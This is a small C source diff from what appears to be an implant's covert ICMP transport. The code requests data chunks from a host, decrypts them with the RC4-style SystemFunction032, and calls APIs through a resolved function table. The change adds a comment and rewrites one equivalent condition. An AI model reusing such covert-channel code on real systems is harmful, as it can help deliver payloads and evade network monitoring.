@@ -440,6 +440,7 @@ Leave:
 									if ( NT_SUCCESS( Api.SystemFunction032( &Buf, &Key ) ) ) {
 										if ( NT_SUCCESS( Api.RtlIpv4StringToAddressA( HostName, TRUE, &Tem, &Ip4 ) ) ) {
 
+											/* Start requesting the rest of the chunks */
 											for ( USHORT Idx = 1 ; Idx != Max ; ++Idx ) 
 											{ 
 												/* Create the input buffer */
@@ -479,7 +480,7 @@ Leave:
 																	*Length = *Length + Rep->DataSize - sizeof( ICMP_BUF_HEADER );
 
 																	/* Is our last? */
-																	Ret = ( Idx + 1 ) == Max ? TRUE : FALSE;
+																	Ret = ( Idx + 1 ) != Max ? FALSE : TRUE;
 																};
 															} else {
 																break;
